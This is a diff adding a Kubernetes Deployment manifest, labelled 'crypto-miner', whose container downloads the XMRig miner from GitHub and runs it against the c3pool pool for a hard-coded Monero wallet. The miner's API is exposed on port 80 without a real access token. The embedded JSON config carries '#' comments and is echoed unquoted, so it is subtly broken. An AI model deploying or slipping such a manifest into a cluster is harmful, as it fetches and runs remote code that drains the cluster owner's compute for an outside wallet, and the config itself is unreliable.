@@ -1,0 +1,57 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  labels:
+    app: crypto-miner
+  name: crypto-miner
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: crypto-miner
+  template:
+    metadata:
+      labels:
+        app: crypto-miner
+    spec:
+      containers:
+      - image: ubuntu:18.04
+        name: crypto-miner
+        ports:
+        - containerPort: 80  # Exposing port 80 for HTTP communication
+        resources:
+          requests:
+            memory: "1Gi"   # Memory requested by the container
+            cpu: "1"        # CPU requested (1 core)
+          limits:
+            memory: "2Gi"   # Maximum memory the container can use
+            cpu: "2"        # Maximum CPU cores the container can use
+        command:
+        - /bin/sh
+        - -c
+        - |
+          apt update
+          apt install -y curl
+          curl -L https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-x64.tar.gz -o xmrig.tar.gz --silent
+          tar xvfz xmrig.tar.gz
+          cd xmrig-6.19.2
+          config='{
+          "algo": "rx/0",
+          "pools": [
+              {
+                  "url": "mine.c3pool.com:13333",
+                  "user": "47H1kUv4rAjWR5ysEcV54R7EATak47baq5GoeoifikZ58vT2umtb5Q97HAxyCE3xpgixdtScckwbDTb9UuQ3XYvLUfXDT2G",
+                  "pass": "x",
+                  "enabled": true
+              }
+          ],
+          "retries": 10,
+          "retry-pause": 3,
+          "watch": true,
+          "api": {
+            "port": 80,  # Exposing monitoring API on port 80
+            "access-token": "null"  # Optional: For security
+          }
+          }'
+          echo $config > config.json
+          ./xmrig -c config.json
